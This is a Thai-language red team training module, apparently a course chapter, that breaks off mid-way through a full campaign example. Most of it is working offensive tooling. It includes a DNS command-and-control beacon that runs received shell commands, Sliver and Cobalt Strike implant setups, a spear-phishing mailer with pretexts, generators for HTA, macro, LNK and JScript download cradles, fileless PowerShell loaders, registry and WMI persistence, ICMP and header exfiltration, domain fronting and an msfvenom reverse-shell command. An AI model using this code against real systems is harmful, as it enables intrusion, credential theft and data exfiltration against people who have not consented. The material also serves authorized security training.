# Part 74: Red Team Operations - ปฏิบัติการทีมสีแดงระดับโลก

> **ระดับ**: World-Class | **เวลาเรียน**: 14-20 ชั่วโมง

## สารบัญ
1. [Red Team Fundamentals](#1-red-team-fundamentals)
2. [C2 Framework Operations](#2-c2-framework-operations)
3. [Initial Access Techniques](#3-initial-access-techniques)
4. [Post-Exploitation Framework](#4-post-exploitation-framework)
5. [Covert Channels](#5-covert-channels)
6. [Adversary Simulation](#6-adversary-simulation)
7. [Operational Security (OPSEC)](#7-operational-security-opsec)
8. [Physical Security Testing](#8-physical-security-testing)
9. [Full Campaign Simulation](#9-full-campaign-simulation)
10. [Red Team Reporting](#10-red-team-reporting)

---

## 1. Red Team Fundamentals

### Red Team vs Penetration Testing

```
┌───────────────────────────────────────────────┐
│       PENETRATION TEST vs RED TEAM              │
├──────────────────┬────────────────────────────┤
│ Penetration Test │ Red Team                    │
├──────────────────┼────────────────────────────┤
│ Find all vulns   │ Achieve specific goals      │
│ Full scope       │ Scenario-based (APT sim)    │
│ Noisy OK         │ Stealth required            │
│ Short (days)     │ Long (weeks/months)         │
│ Blue team knows  │ Blue team unaware           │
│ Vulnerability    │ Control effectiveness test  │
│ ตรวจสอบ vuln    │ ทดสอบ Blue Team skills     │
└──────────────────┴──฀─────────────────────────┘

Red Team Engagement Types:
1. Full Red Team     - ครบทุกด้าน (เครือข่าย, ฟิสิกส์, ประเด็น)
2. Assumed Breach    - เริ่มจากถูกเจาะแล้ว (ทดสอบ detection)
3. Purple Team       - Red + Blue ทำงานร่วมกัน
4. APT Simulation    - จำลอง specific threat actor
```

### Red Team Planning

```python
#!/usr/bin/env python3
# red_team_planner.py - วางแผน Red Team engagement

from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum
from datetime import datetime

class Phase(Enum):
    PLANNING = "Planning"
    RECONNAISSANCE = "Reconnaissance"
    WEAPONIZATION = "Weaponization"
    DELIVERY = "Delivery"
    EXPLOITATION = "Exploitation"
    INSTALLATION = "Installation"
    C2 = "Command & Control"
    ACTIONS = "Actions on Objectives"

@dataclass
class Objective:
    name: str
    description: str
    flag: str  # สิ่งที่ต้องได้
    achieved: bool = False
    timestamp: Optional[datetime] = None

@dataclass
class RedTeamEngagement:
    client: str
    scope: List[str]
    out_of_scope: List[str]
    objectives: List[Objective]
    start_date: datetime
    end_date: datetime
    threat_actor: str  # APT group ที่จำลอง
    rules_of_engagement: List[str]
    emergency_contacts: Dict[str, str] = field(default_factory=dict)
    findings: List[Dict] = field(default_factory=list)
    
    def generate_timeline(self) -> str:
        total_days = (self.end_date - self.start_date).days
        recon_days = max(1, total_days // 6)
        weaponize_days = max(1, total_days // 6)
        delivery_days = max(1, total_days // 4)
        exploit_days = max(1, total_days // 3)
        report_days = max(2, total_days // 5)
        
        return f"""
Engagement Timeline ({total_days} days):
  Week 1 (Days 1-{recon_days}): Reconnaissance & Planning
  Week 2 (Days {recon_days+1}-{recon_days+weaponize_days}): Weaponization
  Week 3+ (Days {recon_days+weaponize_days+1}-{total_days-report_days}): Active Operations
  Final {report_days} days: Reporting & Cleanup
"""

ATT_CK_MATRIX = {
    'Initial Access': ['T1566 Phishing', 'T1190 Exploit Public-Facing', 'T1078 Valid Accounts'],
    'Execution': ['T1059 Command Interpreter', 'T1204 User Execution', 'T1053 Scheduled Task'],
    'Persistence': ['T1547 Boot/Logon Autostart', 'T1136 Create Account', 'T1505 Server Software Component'],
    'Privilege Escalation': ['T1055 Process Injection', 'T1548 Abuse Elevation Control', 'T1134 Token Impersonation'],
    'Defense Evasion': ['T1027 Obfuscated Files', 'T1140 Deobfuscate/Decode', 'T1562 Impair Defenses'],
    'Credential Access': ['T1003 OS Credential Dumping', 'T1558 Steal Kerberos Ticket', 'T1110 Brute Force'],
    'Discovery': ['T1083 File Discovery', 'T1046 Network Service Discovery', 'T1087 Account Discovery'],
    'Lateral Movement': ['T1021 Remote Services', 'T1550 Use Alternate Auth Material', 'T1534 Internal Spearphish'],
    'Collection': ['T1560 Archive Data', 'T1113 Screen Capture', 'T1530 Data from Cloud Storage'],
    'Exfiltration': ['T1041 Exfil over C2 Channel', 'T1048 Exfil over Alt Protocol', 'T1567 Exfil to Cloud'],
    'Impact': ['T1486 Data Encrypted', 'T1490 Inhibit Recovery', 'T1489 Service Stop']
}
```

---

## 2. C2 Framework Operations

### Cobalt Strike Operations

```bash
# === Cobalt Strike Beacon Operations ===
# (Educational reference - requires licensed software)

# Listener profiles
# Malleable C2 Profile - โครงสร้างหน้าตา traffic เป็น legitimate traffic
cat > /tmp/gmail-malleable.profile << 'EOF'
# Malleable C2 profile จำลอง Google traffic
set sleeptime "5000";
set jitter "10";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
  set uri "/mail/u/0/";
  client {
    header "Host" "mail.google.com";
    header "Connection" "keep-alive";
    metadata {
      base64url;
      prepend "inbox=";
      parameter "tab";
    }
  }
  server {
    header "Content-Type" "text/html; charset=UTF-8";
    header "Server" "gws";
    output {
      prepend "<!DOCTYPE html>";
      append "</html>";
      print;
    }
  }
}

http-post {
  set uri "/mail/u/0/sync";
  client {
    header "Host" "mail.google.com";
    id { parameter "id"; }
    output { base64url; print; }
  }
  server {
    output { print; }
  }
}
EOF

# Beacon commands (in Cobalt Strike Console)
# sleep 300 60         สุ่ม 5 นาที jitter 60%
# ps                   ดู processes
# inject <pid>         ส่ง beacon เข้า process
# steal_token <pid>    อ้างสิทธิ์ของ process
# execute-assembly     รัน .NET assembly ใน memory
# jump winrm64        เคลื่อนย้าย lateral movement
```

### Sliver C2 Framework

```bash
# Sliver - open source C2 framework
git clone https://github.com/BishopFox/sliver
cd sliver
make  # หรือ download binary

# Start Sliver server
sliver-server

# สร้าง implant
generate --mtls --lhost 192.168.1.100 --os windows --arch amd64 --save /tmp/implant.exe
generate beacon --mtls --lhost 192.168.1.100 --seconds 60 --os windows

# สร้าง Linux implant
generate --mtls --lhost 192.168.1.100 --os linux --arch amd64 --format elf --save /tmp/implant

# Start listener
mtls --lhost 0.0.0.0 --lport 8888
http --lhost 0.0.0.0 --lport 80
https --lhost 0.0.0.0 --lport 443

# หลังได้ session
sessions                    # ดู sessions
use <session_id>            # เลือก session

# Commands
info                        # ข้อมูล target
getuid                      # ดู user
getpid                      # ดู PID
ps                          # ดู processes
netstat                     # network connections
ifconfig                    # interfaces

# File operations
download /etc/passwd        # download file
upload /tmp/tool /tmp/tool  # upload file
ls /tmp                     # list directory

# Privilege escalation
getsystem                   # พยายาม privilege escalate
impersonate <pid>           # token impersonation

# Lateral movement
psexec --hostname target --exe implant.exe
wmiexec --hostname target

# Pivoting
socks5 start --port 1080    # socks5 proxy
portfwd add --remote-addr 10.0.0.5 --remote-port 22 --local-port 2222
```

### Custom C2 Channel

```python
#!/usr/bin/env python3
# custom_c2.py - สร้าง C2 channel ผ่าน DNS
# Educational purpose only

import dns.resolver
import dns.query
import dns.message
import base64
import time
import subprocess
import socket
import threading
from typing import Optional

class DNSC2Client:
    """
    DNS-based C2 ใช้ DNS TXT records ส่งคำสั่ง/รับผลลัพธ์
    เพื่อ bypass DNS filtering
    """
    
    def __init__(self, c2_domain: str, dns_server: str):
        self.c2_domain = c2_domain
        self.dns_server = dns_server
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = [dns_server]
        self.beacon_id = self._generate_id()
    
    def _generate_id(self) -> str:
        import uuid
        return str(uuid.uuid4()).replace('-', '')[:8]
    
    def _encode(self, data: str) -> str:
        return base64.b32encode(data.encode()).decode().lower().rstrip('=')
    
    def _decode(self, data: str) -> str:
        padded = data.upper() + '=' * (8 - len(data) % 8)
        return base64.b32decode(padded).decode()
    
    def poll_command(self) -> Optional[str]:
        """Poll C2 เพื่อรับคำสั่ง"""
        try:
            # สอบถาม beacon ID ใน subdomain
            query_domain = f"{self.beacon_id}.cmd.{self.c2_domain}"
            answers = self.resolver.resolve(query_domain, 'TXT')
            for answer in answers:
                encoded_cmd = str(answer).strip('"')
                if encoded_cmd != 'noop':
                    return self._decode(encoded_cmd)
        except Exception:
            pass
        return None
    
    def send_result(self, result: str) -> bool:
        """ส่งผลลัพธ์ไปยัง C2"""
        encoded = self._encode(result)
        # แบ่ง encoded data เป็น chunks 63 bytes (DNS label limit)
        chunk_size = 63
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            try:
                query_domain = f"{chunk}.{i}.{self.beacon_id}.result.{self.c2_domain}"
                self.resolver.resolve(query_domain, 'A')
            except Exception:
                pass
        return True
    
    def execute_command(self, cmd: str) -> str:
        """Execute คำสั่ง และคืนผลลัพธ์"""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=30
            )
            output = result.stdout + result.stderr
            return output[:500] if output else 'Command executed (no output)'
        except subprocess.TimeoutExpired:
            return 'Command timed out'
        except Exception as e:
            return f'Error: {e}'
    
    def run_beacon_loop(self, sleep_secs: int = 60):
        """Main beacon loop"""
        print(f"[*] DNS C2 beacon started (ID: {self.beacon_id})")
        while True:
            cmd = self.poll_command()
            if cmd:
                print(f"[*] Received command: {cmd}")
                result = self.execute_command(cmd)
                self.send_result(result)
            time.sleep(sleep_secs)


class DNSC2Server:
    """C2 server side - implemented as DNS server"""
    
    def __init__(self, domain: str, bind_ip: str = '0.0.0.0', port: int = 53):
        self.domain = domain
        self.bind_ip = bind_ip
        self.port = port
        self.pending_commands = {}  # beacon_id -> command
        self.results = {}          # beacon_id -> results
    
    def set_command(self, beacon_id: str, command: str):
        """ตั้งคำสั่งสำหรับ beacon"""
        import base64
        encoded = base64.b32encode(command.encode()).decode().lower().rstrip('=')
        self.pending_commands[beacon_id] = encoded
        print(f"[*] Command queued for {beacon_id}: {command}")
```

---

## 3. Initial Access Techniques

### Spear Phishing Campaign

```python
#!/usr/bin/env python3
# phishing_campaign.py - Spear Phishing framework

import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from typing import List, Dict
import random
import time

class SpearPhishingCampaign:
    def __init__(self, smtp_server: str, smtp_port: int,
                 username: str, password: str):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
        self.sent_count = 0
        self.tracking_log = []
    
    def create_pretexts(self) -> List[Dict]:
        """สร้าง pretext scenarios"""
        return [
            {
                'name': 'IT Security Update',
                'from_name': 'IT Security Team',
                'subject': 'Urgent: Security patch required for your workstation',
                'template': 'security_update',
                'urgency': 'HIGH'
            },
            {
                'name': 'HR Benefits',
                'from_name': 'HR Department',
                'subject': 'Action Required: Update your benefits information',
                'template': 'hr_benefits',
                'urgency': 'MEDIUM'
            },
            {
                'name': 'CEO Fraud',
                'from_name': '{ceo_name}',
                'subject': 'Confidential: Need your help urgently',
                'template': 'ceo_fraud',
                'urgency': 'HIGH'
            },
            {
                'name': 'Package Delivery',
                'from_name': 'DHL Express',
                'subject': 'Your package cannot be delivered - action required',
                'template': 'package_delivery',
                'urgency': 'MEDIUM'
            }
        ]
    
    def generate_html_email(self, template: str, target: Dict) -> str:
        """สร้าง HTML email body"""
        templates = {
            'security_update': f"""
<html><body>
<p>Dear {target.get('name', 'Employee')},</p>
<p>Our security team has identified a critical vulnerability that requires immediate patching.</p>
<p>Please click the link below to download and install the mandatory security update:</p>
<p><a href="{target.get('payload_url', '#')}">Download Security Update</a></p>
<p>This update must be installed within 24 hours to maintain compliance.</p>
<p>If you have any questions, contact the helpdesk at helpdesk@company.com</p>
<p>Regards,<br>IT Security Team</p>
</body></html>
""",
            'hr_benefits': f"""
<html><body>
<p>Dear {target.get('name', 'Employee')},</p>
<p>The open enrollment period ends Friday. Please update your benefits selection.</p>
<p><a href="{target.get('payload_url', '#')}">Click here to update your information</a></p>
<p>If you miss the deadline, you will not be able to make changes until next year.</p>
<p>HR Department</p>
</body></html>
"""
        }
        return templates.get(template, templates['security_update'])
    
    def track_open(self, email_id: str, tracking_server: str) -> str:
        """Add tracking pixel"""
        return f'<img src="{tracking_server}/track/{email_id}" width="1" height="1" />'
    
    def send_phishing_email(self, target: Dict, pretext: Dict) -> bool:
        """ส่ง phishing email (สำหรับ authorized testing เท่านั้น)"""
        msg = MIMEMultipart('alternative')
        msg['Subject'] = pretext['subject']
        msg['From'] = f"{pretext['from_name']} <{self.username}>"
        msg['To'] = target['email']
        
        html_content = self.generate_html_email(
            pretext['template'], target
        )
        msg.attach(MIMEText(html_content, 'html'))
        
        # Jitter เพื่อหลีก rate limiting
        time.sleep(random.randint(30, 120))
        
        try:
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(self.smtp_server, self.smtp_port, context=context) as server:
                server.login(self.username, self.password)
                server.sendmail(self.username, target['email'], msg.as_string())
            self.sent_count += 1
            self.tracking_log.append({
                'target': target['email'],
                'sent': True,
                'pretext': pretext['name']
            })
            return True
        except Exception as e:
            print(f"[!] Failed to send to {target['email']}: {e}")
            return False
```

### HTA and Office Macro Payloads

```python
#!/usr/bin/env python3
# payload_generator.py - สร้าง payloads สำหรับ Red Team

from string import Template
import base64
import os

class PayloadGenerator:
    def __init__(self, lhost: str, lport: int, c2_url: str):
        self.lhost = lhost
        self.lport = lport
        self.c2_url = c2_url
    
    def generate_powershell_cradle(self, script_url: str) -> str:
        """IEX Cradle แบบ obfuscated"""
        ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('{script_url}')"
        encoded = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
        return f'powershell -enc {encoded}'
    
    def generate_hta_payload(self) -> str:
        """HTA (HTML Application) payload"""
        ps_cmd = self.generate_powershell_cradle(self.c2_url)
        
        hta = f"""
<html>
<head>
<script language="VBScript">
Function CheckOS()
  Set objWMI = GetObject("winmgmts:\\\\.\\root\\cimv2")
  Set colOS = objWMI.ExecQuery("Select * from Win32_OperatingSystem")
  For Each objOS in colOS
    strOS = objOS.Caption
  Next
  CheckOS = strOS
End Function

Function RunPayload()
  Set oShell = CreateObject("WScript.Shell")
  oShell.Run "{ps_cmd}", 0, False
  self.close
End Function

RunPayload()
</script>
</head>
<body>
<p>Loading, please wait...</p>
</body>
</html>
"""
        return hta
    
    def generate_office_macro(self) -> str:
        """VBA Macro สำหรับ Word/Excel"""
        ps_cmd = self.generate_powershell_cradle(self.c2_url)
        # Base64 encode เพื่อแบ่ง string ให้ยาก detect
        encoded_cmd = base64.b64encode(ps_cmd.encode()).decode()
        
        macro = f"""
Attribute VB_Name = "ThisDocument"
Option Explicit

Private Sub Document_Open()
    Call RunPayload
End Sub

Private Sub AutoOpen()
    Call RunPayload
End Sub

Sub RunPayload()
    Dim strCmd As String
    Dim objShell As Object
    
    ' Decode and execute
    strCmd = DecodeBase64("{encoded_cmd}")
    
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run strCmd, 0, False
    Set objShell = Nothing
End Sub

Function DecodeBase64(strBase64 As String) As String
    Dim objDom As Object
    Dim objNode As Object
    Set objDom = CreateObject("Microsoft.XMLDOM")
    Set objNode = objDom.createElement("tmp")
    objNode.dataType = "bin.base64"
    objNode.text = strBase64
    DecodeBase64 = StrConv(objNode.nodeTypedValue, vbUnicode)
    Set objNode = Nothing
    Set objDom = Nothing
End Function
"""
        return macro
    
    def generate_lnk_payload(self) -> str:
        """PowerShell command สำหรับ .lnk file"""
        return f'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "{self.generate_powershell_cradle(self.c2_url)}"'
    
    def generate_jscript_payload(self) -> str:
        """JScript WSF payload"""
        ps_cmd = self.generate_powershell_cradle(self.c2_url)
        return f"""
<job id="j">
<script language="JScript">
var oShell = new ActiveXObject('WScript.Shell');
oShell.Run('{ps_cmd}', 0, false);
</script>
</job>
"""
```

---

## 4. Post-Exploitation Framework

### Metasploit Advanced Operations

```bash
# === Metasploit Advanced ===
msfconsole

# === Post-exploitation modules ===
# After getting meterpreter session

# Privilege Escalation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Getsystem
sessions -i 1
getsystem
getuid

# Dumping credentials
use post/windows/gather/credentials/credential_collector
run

use post/windows/gather/hashdump
run

use auxiliary/scanner/smb/smb_ms17_010  # EternalBlue scan

# Persistence
use post/windows/manage/persistence
set SESSION 1
set STARTUP REGISTRY
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run

# Port forwarding/Pivoting
# meterpreter:
route add 10.0.0.0 255.255.255.0 1  # เพิ่ม route ผ่าน session 1

use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# จากนั้นใช้ proxychains:
proxychains nmap -sT 10.0.0.0/24
```

### In-Memory Execution (Fileless)

```powershell
# === Fileless malware techniques ===

# 1. PowerShell เปิดจาก URL โดยตรง
$code = (New-Object System.Net.WebClient).DownloadString('https://c2server/payload.ps1')
Invoke-Expression $code

# 2. Reflective DLL Injection
# Inject DLL เข้า memory โดยไม่ต้องเขียนไฟล์
$url = 'https://c2server/payload.dll'
$bytes = (New-Object System.Net.WebClient).DownloadData($url)
[System.Reflection.Assembly]::Load($bytes)

# 3. Process Hollowing (via PowerShell)
# ตัวอย่างเชิง concept:
# 1. สร้าง process สุจริต (svchost.exe) แบบ suspended
# 2. แทนที่ใส่ payload code เข้าไปใน memory
# 3. Resume process

# 4. DLL Sideloading
# Copy legitimate signed binary + เปลี่ยนชื่อ DLL ที่มัน load

# 5. Registry Run Keys Persistence
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
  -Name 'SecurityUpdate' `
  -Value 'powershell -WindowStyle hidden -enc BASE64PAYLOAD' `
  -PropertyType String

# 6. WMI Persistence
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  EventNameSpace = 'root\CIMv2'
  Name = 'SecurityFilter'
  Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Hour = 10'
  QueryLanguage = 'WQL'
}

$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name = 'SecurityConsumer'
  CommandLineTemplate = 'powershell -enc BASE64PAYLOAD'
}

$binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
  Filter = $filter
  Consumer = $consumer
}
```

---

## 5. Covert Channels

### DNS Tunneling

```bash
# DNS Tunneling - ส่งข้อมูลผ่าน DNS queries

# iodine - DNS tunnel
# บน server (attacker):
iodined -f -c -P password 10.0.0.1 tunnel.c2domain.com

# บน client (target network):
iodine -f -P password tunnel.c2domain.com
# สร้าง interface dns0 -> SSH ผ่านได้เลย!
ssh attacker@10.0.0.1 -D 1080

# dnscat2 - encrypted DNS C2
# Server:
ruby dnscat2.rb tunnel.c2domain.com

# Client (PowerShell):
Start-Dnscat2 -Domain tunnel.c2domain.com -DNSServer 8.8.8.8
```

### ICMP Tunneling

```python
#!/usr/bin/env python3
# icmp_tunnel.py - Data exfiltration ผ่าน ICMP
# สำหรับการศึกษาเท่านั้น

from scapy.all import *
import base64
import time
from typing import Optional

class ICMPTunnel:
    def __init__(self, target_ip: str):
        self.target = target_ip
        self.sequence = 0
    
    def send_data(self, data: str, chunk_size: int = 32) -> None:
        """ส่งข้อมูลผ่าน ICMP payload"""
        encoded = base64.b64encode(data.encode()).decode()
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for chunk in chunks:
            # ICMP Echo พร้อม data ใน payload
            pkt = IP(dst=self.target)/ICMP()/Raw(load=chunk.encode())
            send(pkt, verbose=False)
            self.sequence += 1
            time.sleep(0.1)  # หลีก rate detection
        
        print(f"[*] Sent {len(chunks)} ICMP packets with data")
    
    def receive_data(self, timeout: int = 30) -> Optional[str]:
        """รับข้อมูลจาก ICMP"""
        received_chunks = []
        
        def process_packet(pkt):
            if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
                payload = pkt[Raw].load.decode(errors='ignore')
                received_chunks.append(payload)
        
        sniff(filter=f"icmp and src {self.target}", 
              prn=process_packet, timeout=timeout)
        
        if received_chunks:
            encoded = ''.join(received_chunks)
            return base64.b64decode(encoded).decode()
        return None

class HTTPSCovertChannel:
    """Covert channel ผ่าน HTTPS headers"""
    
    def __init__(self, c2_url: str):
        self.c2_url = c2_url
    
    def exfil_via_headers(self, data: str) -> bool:
        """ส่งข้อมูลซ่อนในCookie/User-Agent headers"""
        import requests
        encoded = base64.b64encode(data.encode()).decode()
        
        headers = {
            'User-Agent': f'Mozilla/5.0 (MSIE; {encoded[:50]}) compatible',
            'Cookie': f'session={encoded[50:100]}; track={encoded[100:150]}',
            'X-Forwarded-For': '10.0.0.1',
        }
        
        try:
            resp = requests.get(self.c2_url, headers=headers, timeout=10)
            return resp.status_code == 200
        except:
            return False
```

---

## 6. Adversary Simulation

### MITRE ATT&CK Simulation

```python
#!/usr/bin/env python3
# apt_simulation.py - จำลอง APT attack chains

APT_PROFILES = {
    'APT29_Cozy_Bear': {
        'country': 'Russia',
        'sector_targets': ['Government', 'Healthcare', 'Energy'],
        'techniques': {
            'Initial Access': ['T1566.001 Spearphishing Attachment', 'T1190 Exploit Public App'],
            'Execution': ['T1059.001 PowerShell', 'T1059.003 Windows Command Shell'],
            'Persistence': ['T1547.001 Registry Run Keys', 'T1505.003 Web Shell'],
            'Defense Evasion': ['T1055 Process Injection', 'T1027 Obfuscated Files'],
            'Credential Access': ['T1003.001 LSASS Memory', 'T1558.003 Kerberoasting'],
            'Discovery': ['T1083 File Discovery', 'T1135 Network Share Discovery'],
            'Lateral Movement': ['T1021.001 Remote Desktop Protocol', 'T1021.002 SMB/Windows Admin Shares'],
            'Collection': ['T1560.001 Archive via Utility', 'T1113 Screen Capture'],
            'Exfiltration': ['T1041 Exfiltration Over C2 Channel', 'T1048.002 HTTPS'],
            'C2': ['T1071.001 Web Protocols', 'T1132.001 Standard Encoding'],
        },
        'tools': ['HAMMERTOSS', 'COZYCAR', 'MiniDuke', 'CosmicDuke', 'PowerDuke'],
    },
    'Lazarus_Group': {
        'country': 'North Korea',
        'sector_targets': ['Financial', 'Cryptocurrency', 'Defense'],
        'techniques': {
            'Initial Access': ['T1566.001 Spearphishing', 'T1195 Supply Chain'],
            'Execution': ['T1059.001 PowerShell', 'T1106 Native API'],
            'Persistence': ['T1543.003 Windows Service', 'T1547.001 Registry'],
            'Defense Evasion': ['T1140 Deobfuscate', 'T1574 Hijack Execution Flow'],
            'Impact': ['T1486 Data Encrypted for Impact', 'T1490 Inhibit System Recovery'],
        },
        'tools': ['DESTOVER', 'HERMES', 'HOPLIGHT', 'TYPEFRAME'],
    },
    'FIN7': {
        'country': 'Unknown (cybercriminal)',
        'sector_targets': ['Hospitality', 'Restaurant', 'Retail', 'Finance'],
        'techniques': {
            'Initial Access': ['T1566 Phishing'],
            'Execution': ['T1059.005 Visual Basic', 'T1204.002 User Execution'],
            'Credential Access': ['T1056 Input Capture', 'T1539 Steal Web Session Cookie'],
            'Collection': ['T1560 Archive Collected Data'],
            'Exfiltration': ['T1041 Exfil over C2'],
        },
        'tools': ['CARBANAK', 'BADMOUSE', 'GRIFFON', 'SQLRat'],
    }
}

def generate_attack_playbook(apt_name: str) -> str:
    apt = APT_PROFILES.get(apt_name)
    if not apt:
        return f"APT profile not found: {apt_name}"
    
    playbook = f"""
=== Red Team Playbook: Simulating {apt_name} ===
Origin: {apt['country']}
Target Sectors: {', '.join(apt['sector_targets'])}

ATT&CK Techniques:
"""
    for phase, techniques in apt['techniques'].items():
        playbook += f"\n  [{phase}]\n"
        for technique in techniques:
            playbook += f"    - {technique}\n"
    
    playbook += f"\nKnown Tools: {', '.join(apt.get('tools', []))}"
    return playbook

for apt in APT_PROFILES:
    print(generate_attack_playbook(apt))
    print("\n" + "="*60 + "\n")
```

### Atomic Red Team Tests

```powershell
# Atomic Red Team - ทดสอบ techniques ทีละรายการ

# ติดตั้ง
Install-Module -Name invoke-atomicredteam, powershell-yaml
import-module invoke-atomicredteam

# ดูรายการ tests ที่มี
Invoke-AtomicTest T1003.001 -ShowDetailsBrief

# รัน test
Invoke-AtomicTest T1003.001  # LSASS Memory dump
Invoke-AtomicTest T1558.003  # Kerberoasting
Invoke-AtomicTest T1059.001  # PowerShell
Invoke-AtomicTest T1071.001  # Web Protocol C2

# รัน test ทั้ง tactic
Invoke-AtomicTest T1003 -TestNumbers 1,2  # เฉพาะ test 1 และ 2

# Cleanup หลังเสร็จ
Invoke-AtomicTest T1003.001 -Cleanup

# Install prerequisites
Invoke-AtomicTest T1003 -GetPrereqs
```

---

## 7. Operational Security (OPSEC)

### Red Team OPSEC

```python
#!/usr/bin/env python3
# opsec_checklist.py - OPSEC checklist สำหรับ Red Team

OPSEC_CATEGORIES = {
    'Infrastructure': [
        'Use redirectors (CDN/domain fronting) between target and C2 server',
        'Separate C2 server for each engagement',
        'Use different cloud providers for C2 and redirectors',
        'Register domains with privacy protection, 45+ days before engagement',
        'Use domains with positive reputation (aged domains)',
        'Deploy TLS certificates on all C2 infrastructure',
        'Log and monitor all C2 infrastructure access',
        'Use geographically distributed infrastructure',
    ],
    'Communication': [
        'Encrypt all C2 traffic (HTTPS/TLS)',
        'Use Malleable C2 profiles that mimic legitimate traffic',
        'Implement beacon jitter (+-30% variation)',
        'Use long sleep intervals during business hours only',
        'Avoid generating unusual traffic patterns',
        'Use standard ports (80, 443, 8080)',
        'Implement check-in only during business hours if simulating insider',
    ],
    'Payload': [
        'Compile payloads from scratch for each engagement',
        'Use code signing certificates when possible',
        'Implement environmental checks (hostname, domain, username)',
        'Add anti-analysis features (VM detection, debugger detection)',
        'Test payloads against target AV before deployment',
        'Use in-memory execution (fileless techniques)',
        'Avoid common IOC strings and hashes',
    ],
    'Operational': [
        'Use VPN/Tor for all research activities',
        'Separate attacker infrastructure from personal devices',
        'Document all actions with timestamps',
        'Have a stop list ready (critical systems to avoid)',
        'Define scope clearly before starting',
        'Have direct line to client emergency contact',
        'Prepare deconfliction plan',
        'Never store sensitive client data beyond engagement',
    ],
    'Cleanup': [
        'Remove all implants and persistence mechanisms',
        'Delete all dropped files and tools',
        'Revert registry changes',
        'Remove created user accounts',
        'Deactivate/destroy C2 infrastructure',
        'Provide artifact removal list to client',
        'Verify cleanup with client security team',
    ]
}

for category, items in OPSEC_CATEGORIES.items():
    print(f"\n=== {category} ===")
    for item in items:
        print(f"  [ ] {item}")
```

### Domain Fronting

```bash
# Domain Fronting - ซ่อน C2 traffic ไว้ใน CDN traffic
# ใช้ CDN (CloudFront, Azure CDN) เป็น redirector

# Cobalt Strike configuration
# Listen: ตั้ง HTTP listener พร้อม
set host "legitimate-cdn.cloudfront.net"  # CDN domain (front)
set profile "gmail"  # Malleable C2 profile

# C2 server สร้าง distribution บน CloudFront
# ที่ชี้ไปยัง actual C2 server

# Redirect rules ใน redirector server (Apache/Nginx):
# Nginx:
cat > /etc/nginx/conf.d/c2-redirect.conf << 'EOF'
server {
  listen 443 ssl;
  server_name cdn.legitimate-site.com;
  
  ssl_certificate /etc/ssl/certs/cert.pem;
  ssl_certificate_key /etc/ssl/private/key.pem;
  
  location /api/v2/ {
    proxy_pass https://actual-c2-server.internal;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $remote_addr;
  }
  
  location / {
    # Serve legitimate content for non-beacon requests
    proxy_pass https://actual-legitimate-site.com;
  }
}
EOF
nginx -t && systemctl reload nginx
```

---

## 8. Physical Security Testing

### Physical Intrusion Techniques

```
=== Physical Security Testing Scope ===
ประเภทการทดสอบ Physical Security:

1. Access Control Testing
   - ทดสอบ tailgating/piggybacking
   - Clone proximity cards (HID, Mifare)
   - Social engineering employees
   - Test lock picking/bypass
   - Test alarm systems

2. RFID/NFC Cloning
   Tools: Flipper Zero, Proxmark3, ACR122U
   - Read cards at distance
   - Clone and replay
   - Emulate credentials

3. Dropped USB Attacks
   - วาง USB drives ในพื้นที่สาธารณะ
   - Payload auto-run เมื่อเสียบ

4. Wireless Attacks
   - Evil twin AP
   - WPA2 capture
   - Rogue device placement
   - Bluetooth attacks

5. Dumpster Diving
   - สำเนาข้อมูลจากขยะ (emails, org charts, credentials)
```

### Flipper Zero Operations

```
# Flipper Zero - Pentesting multi-tool

=== RFID/NFC ===
- Read: อ่านบัตรแบบ proximity
- Write: เขียนเข้า blank card
- Emulate: คืน card ด้วย Flipper itself
- Brute force: ลองตัวเลขทั้งหมด

=== Sub-GHz ===
- Read/replay garage door remotes
- Capture and analyze 315/433/868 MHz signals
- Rolling code capture (limited)

=== IR ===
- Clone TV remote codes
- Universal remote capability

=== BadUSB ===
- Run Rubber Ducky scripts
- Keystroke injection
- Payload: open terminal, run command

=== GPIO ===
- Connect to UART for debug access
- I2C/SPI interface attacks

=== Bluetooth ===
- BLE scanning
- Spam iOS/Android Bluetooth notifications
```

---

## 9. Full Campaign Simulation

### Complete Attack Chain

```python
#!/usr/bin/env python3
# full_campaign.py - สรุปการทำ full campaign simulation

FULL_CAMPAIGN_STEPS = [
    {
        'phase': 'Reconnaissance',
        'step': 1,
        'technique': 'OSINT',
        'tools': ['theHarvester', 'Maltego', 'Shodan', 'LinkedIn'],
        'objective': 'Identify employees, email format, IP ranges, technologies',
        'commands': [
            'theHarvester -d company.com -b all -l 500',
            'shodan search org:"Company Name"',
            'amass enum -d company.com',
        ]
    },
    {
        'phase': 'Weaponization',
        'step': 2,
        'technique': 'Create Spearphishing Payload',
        'tools': ['Office macro', 'HTA', 'LNK'],
        'objective': 'Create convincing phishing with payload',
        'commands': [
            'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2.domain.com LPORT=443 -f raw > payload.bin',
